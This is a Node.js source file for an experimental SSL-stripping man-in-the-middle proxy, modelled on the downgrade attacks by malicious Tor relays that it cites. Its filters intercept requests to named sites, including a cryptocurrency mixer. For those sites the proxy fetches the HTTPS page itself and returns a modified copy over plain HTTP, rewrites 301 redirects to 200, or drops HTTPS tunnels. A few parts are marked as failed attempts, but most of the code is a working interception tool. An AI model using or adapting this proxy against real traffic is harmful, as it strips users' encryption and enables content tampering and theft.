// trying a downgrade attack similar to https://medium.com/@nusenu/how-malicious-tor-relays-are-exploiting-users-in-2020-part-i-1097575c0cac
// when user attempts to go to https website we will inject a 301 redirect to HTTP
// run with arg test to open a local proxy
/*


          We will need to setup a connection to the target as a client and then forward traffic back through http to our victium


*/

// using https://github.com/joeferner/node-http-mitm-proxy#readme

var Proxy = require('http-mitm-proxy');
var iptables = require('./lib/iptables.js');
var net = require('net');
const { Buffer } = require('buffer');
var inherits = require('util').inherits;
const https = require('https');
const { filter } = require('async');

var port = 8080;
var proxy = Proxy();

// match and replace content or drop
// first filter modifies body
// second filter will modify 301 to 200
// third will drop 301 entirely (not allowing header to return)
// Note that target host/ips can only have one filter
exports.filters = [
  // this rule will see a http://nathafain.com request, ignore possible 301 redirect, secretly send to https://, modify the response and return that over http
  {     dsthosts: [ 'nathanfain.com' ],
      urlreplace: [ 'https://nathanfain.com' ], // on dsthosts[N], drop and request urlreplace[N]+urlpath instead
   bodytransform: body => body.toString('utf-8').toUpperCase(),
           debug: true,
           // drop: true, // drop will not send any data in response to client request
        },

  // this rule would drop all https://nathanfain.com requests
  // { dsthosts: [ 'nathanfain.com:443'],
  //       drop: true, },

  // this rune attempts to modify the http initial version. 
  // its a failed attempt to see how far we can play with https proxying
  // currently this form of replacement does not work for HTTPS:
  // these filters *can* be used to drop https requests
  {     dsthosts: [ 'nathanfain.com:443' ],
   bodytransform: body => body.toString('utf-8').replace(/http\/1\.1/gi, 'http/1.2'),
           debug: true, },

  {     dsthosts: [ 'localhost:443' ],
   bodytransform: body => body.toString('utf-8').replace(/http 1\.1/gi, 'http 1.2'),
           // drop: true 
           debug: true, },

  //
  {     dsthosts: [ 'cryptomixer1.com' ],
           debug: true,
   bodytransform: body => body.toString('utf-8').replace(/301 Moved Permanently/g, '200')  },

  {     dsthosts: [ 'cryptomixer1.com:443' ], 
            drop: true },
]

// this is updated by functions that edit filters and is just used to more quickly check for hosts
// retains the filter index
exports.filters_hosts = []; // array of all host names found
exports.filters_index = {}; // 'hostname' = index in filters[]
function update_filters_hosts() {
  exports.filters_hosts = exports.filters.map(f => f.dsthosts).flat();
  exports.filters.forEach( (f, index) => {
    f.dsthosts.forEach(host => {
      exports.filters_index[host] = index;
    });
  });
}
update_filters_hosts();
exports.update_filters_hosts = update_filters_hosts;
exports.filters_get = () => exports.filters;
exports.filters_set = _filters => {
  exports.filters = _filters;
  update_filters_hosts();
}


proxy.onError(function(ctx, err) {
  console.error('proxy error:', err);
});

proxy.onRequest(function(ctx, callback) {
  console.log('onRequest (http)', ctx.clientToProxyRequest.headers.host, ctx.clientToProxyRequest.url)
//  console.log(ctx.clientToProxyRequest.headers)
//  console.log(ctx.clientToProxyRequest.rawHeaders)
//  console.log(ctx.clientToProxyRequest.url)
//  console.log(ctx.clientToProxyRequest.socket._sockname)
//  console.log(ctx.clientToProxyRequest.socket._peername)
//  console.log()
//  console.log(ctx.proxyToClientResponse.socket._sockname)
//  console.log(ctx.proxyToClientResponse.socket._peername)
  
//  console.log(require('util').inspect(ctx, showHidden=true, depth=12, colorize=true));

  if ( exports.filters_hosts.indexOf(ctx.clientToProxyRequest.headers.host) >= 0)
  {
    var _i = exports.filters_index[ctx.clientToProxyRequest.headers.host]
    var filter = exports.filters[_i]
    console.log('filter',filter)
    // URLreplace is used to prevent 301 redirect from http to https
    // we will make the request secretly and return content back over http
    if (filter.hasOwnProperty('urlreplace')) {
      var _idx = filter.dsthosts.indexOf(ctx.clientToProxyRequest.headers.host)
      urlreplace = filter.urlreplace[_idx] + ctx.clientToProxyRequest.url
      console.log(urlreplace, _idx)
      https.get(urlreplace, (res) => {
        console.log('statusCode:', res.statusCode);
        console.log('headers:', res.headers);
        var chunks = [];
        res.on('data', chunk => chunks.push(chunk)); // data is encrypted
        res.on('end', () => { 
          var body = Buffer.concat(chunks)
          if (filter.hasOwnProperty('bodytransform')) {
              body = filter.bodytransform(body)
          }

          if (filter.drop)
            ctx.proxyToClientResponse.socket.destroy(); //end() would send a FIN packet
          else
            ctx.proxyToClientResponse.end(body);

          if (filter.debug)
            console.log( body ) 
        } )

      }).on('error', (e) => {
        console.error(e);
      });
    }
    // Is not urlreplace which indicates this filter intends to just change content of http request and return
    else {
      var chunks = [];

      ctx.onResponseData(function(ctx, chunk, callback) {
        chunks.push(chunk);
        return callback(null, null); // don't write chunks to client response
      });
      ctx.onResponseEnd(function(ctx, callback) {
        var body = Buffer.concat(chunks);
        if (filter.hasOwnProperty('bodytransform')) {
          body = filter.bodytransform(body)
        }

        if (filter.drop)
          ctx.proxyToClientResponse.socket.end();
        else
          ctx.proxyToClientResponse.write(body);

        if (filter.debug)
          console.log( body ) 

        return callback();
      });

    }
  }
});
proxy.onConnect(function(req, client_to_proxy_socket, head) {
  console.log('onConnect (https)',req.headers.host)
  if ( exports.filters_hosts.indexOf(req.headers.host) >= 0)
  {

    var _findx = exports.filters_index[req.headers.host]
    var filter = exports.filters[_findx]
    console.log('filter',filter)
   
    if (filter.drop) {
      client_to_proxy_socket.destroy(); //end() would send a FIN packet supposedly
      return;
    }
    var host = req.url.split(":")[0];
    var port = req.url.split(":")[1];
  
    console.log('Tunnel to', req.url);
    var proxy_to_server_socket = net.connect({
      port: port,
      host: host,
      allowHalfOpen: true
    }, function(){
      proxy_to_server_socket.on('finish', () => {
        client_to_proxy_socket.destroy();
      });
      
      // The following form of collecting data is not used and instead we are currently
      // using socket pipes below this section
      /*
      var chunks = [];
      var buffer;
      proxy_to_server_socket.on('data', chunk => {console.log('.');chunks.push(chunk)}); // data is encrypted
      proxy_to_server_socket.on('end', () => { 
        buffer = Buffer.concat(chunks)
        if (filter.hasOwnProperty('bodytransform')) {
          buffer = filter.bodytransform(buffer)
        }
        if (filter.debug)
          console.log( buffer.toString('utf-8') ) 
        client_to_proxy_socket.write(buffer);
        // client_to_proxy_socket.write('HTTP/1.1 200 OK\r\n\r\n'+buffer.toString('utf-8'), 'UTF-8');
  
      });
      */
      client_to_proxy_socket.on('close', () => {
        proxy_to_server_socket.end();
      });

      // https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections
      // client_to_proxy_socket.write('HTTP/1.1 301 OK\r\nLocation: http://'+host+'\r\n\r\n', 'UTF-8', function(){ // Moved Permanently
      client_to_proxy_socket.write('HTTP/1.1 200 OK\r\n\r\n', 'UTF-8', function(){
        // TODO: if we want to modify SSL encrypted data in transit we will
        //       have to reintroduce the Upperstream pipes
        proxy_to_server_socket.pipe(client_to_proxy_socket);
        // proxy_to_server_socket.pipe(new UpperStream()).pipe(client_to_proxy_socket)
        client_to_proxy_socket.pipe(proxy_to_server_socket);
          
      });
    });
  
    proxy_to_server_socket.on('error', function(err) {
      filterSocketConnReset(err, 'PROXY_TO_SERVER_SOCKET');
    });
    client_to_proxy_socket.on('error', function(err) {
      filterSocketConnReset(err, 'CLIENT_TO_PROXY_SOCKET');
    });
  }
    
  // console.log("### REQ")
  // console.log(require('util').inspect(req, showHidden=true, depth=12, colorize=false));
  // console.log("### SOCKET")
  // console.log(require('util').inspect(socket, showHidden=true, depth=12, colorize=false));
  // console.log("### HEAD")
  // console.log(require('util').inspect(head, showHidden=true, depth=12, colorize=false));
});


// Since node 0.9.9, ECONNRESET on sockets are no longer hidden
function filterSocketConnReset(err, socketDescription) {
  if (err.errno === 'ECONNRESET') {
    console.log('Got ECONNRESET on ' + socketDescription + ', ignoring.');
  } else {
    console.log('Got unexpected error on ' + socketDescription, err);
  }
}

function init (cb) {
  proxy.listen({port: port}, function() {
    console.log('Proxy server listening on ' + port);
    if (typeof cb === 'function')
      cb();
  });
};  
exports.init = init;
exports.close = () => proxy.close();



function test () {
  var cmd = `curl -x http://localhost:${port} http://nocompany.co/ | grep body`;
  console.log('> ' + cmd);
  require('child_process').exec(cmd, function (error, stdout, stderr) {
    if (error) {
      console.error(`exec error: ${error}`);
      return;
    }
    console.log(`${stdout}`);
    // proxy.close();
  });
}


if (process.argv.length > 2) {
  if (process.argv[2] == 'init')
    init()
  else if (process.argv[2] == 'test')
    init(test)
}




/*
curl -v -x 'http://localhost:8080' http://nocompany.co
*/


/*
function UpperStream() {
  TransformStream.call(this);
}
inherits(UpperStream, TransformStream);
UpperStream.prototype._transform = function(chunk, encoding, cb) {
  console.log('.')
  for (var i = 0; i < chunk.length; ++i) {
    var ch = chunk[i];
    // console.log(ch)
    // Check for lowercase character
    // if (ch >= 97 && ch <= 122) {
    //   // Make it uppercase
    //   chunk[i] &= ~32;
    // }
    if (ch == 66 ) {
      console.log("B?")
      // chunk[i] = 98;
    }
  }
  cb(null, chunk);
};
*/